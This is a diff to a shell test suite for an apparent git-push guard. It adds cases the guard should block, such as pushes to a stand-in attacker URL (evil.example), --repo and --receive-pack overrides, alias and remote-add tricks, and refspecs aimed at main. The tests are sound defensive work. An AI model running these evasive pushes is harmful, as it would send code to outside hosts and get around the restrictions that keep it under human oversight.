@@ -19,6 +19,8 @@ git -C "$REPO" init -q -b main
 git -C "$REPO" -c user.name=t -c user.email=t@t commit -q --allow-empty -m init
 git -C "$REPO" branch feature
 git -C "$REPO" tag v1.0
+git -C "$REPO" remote add origin https://example.invalid/repo.git
+git -C "$REPO" remote add backup https://example.invalid/backup.git
 git -C "$REPO" update-ref refs/remotes/origin/trunk-ish HEAD
 git -C "$REPO" symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/trunk-ish
 git -C "$REPO" checkout -q feature
@@ -109,7 +111,10 @@ check "git checkout main && git push"
 assert_blocked "implicit push after checkout in same command"
 
 check "git switch -c topic && git push -u origin topic"
-assert_allowed "explicit feature push after switch"
+assert_blocked "any push after a state-changing git command"
+
+check "git add -A && git commit -qF msg.txt && git push -u origin feature"
+assert_allowed "add/commit then push feature"
 check "git push" "/nonexistent-dir-for-test"
 assert_blocked "implicit push where branch can't be resolved"
 
@@ -160,6 +165,66 @@ git -C "$REPO" config remote.origin.push 'refs/heads/*:refs/heads/main'
 check "git push"
 assert_blocked "remote.origin.push config redirects implicit push"
 git -C "$REPO" config --unset remote.origin.push
+
+suite "Ref and destination tricks — deferred"
+
+check "git push origin feature:heads/main"
+assert_blocked "heads/main DWIM"
+
+check "git push origin feature:refs/remotes/origin/main"
+assert_blocked "non-heads ref under refs/"
+
+check "git push origin 'refs/heads/*:refs/heads/*'"
+assert_blocked "glob refspec"
+
+check "git push https://evil.example/x.git feature"
+assert_blocked "URL destination"
+
+check "git push unknown-remote feature"
+assert_blocked "unconfigured remote"
+
+check "git push --repo=https://evil.example/x.git"
+assert_blocked "--repo override"
+
+check "git push --receive-pack=/tmp/x origin feature"
+assert_blocked "--receive-pack"
+
+check "git --git-dir=/elsewhere/.git push origin feature"
+assert_blocked "--git-dir"
+
+check "git --namespace=foo push origin feature"
+assert_blocked "--namespace"
+
+check "git-push origin main"
+assert_blocked "git-push binary form"
+
+suite "Same-command state changes — deferred"
+
+check "git tag v9 && git push origin v9"
+assert_blocked "tag created then pushed"
+
+check "git config alias.x push && git x origin main"
+assert_blocked "alias defined then used"
+
+check "git remote add evil https://evil.example/x && git push evil feature"
+assert_blocked "remote added then pushed to"
+
+check "git branch -m main && git push origin HEAD"
+assert_blocked "branch renamed then HEAD pushed"
+
+check "pushd /somewhere && git push origin feature"
+assert_blocked "pushd to unknown repo"
+
+check "cd - && git push origin feature"
+assert_blocked "cd - to unknown repo"
+
+suite "Still routine"
+
+check "git push backup feature"
+assert_allowed "configured second remote"
+
+check "git push origin feature:refs/heads/feature"
+assert_allowed "full refs/heads feature dst"
 
 check "git push -q -u origin feature 2>&1 | tail -1; gh pr create --title \"test(chart): x\" --body-file b.md | tail -1"
 assert_allowed "screenshot flow with body-file still auto-allowed"
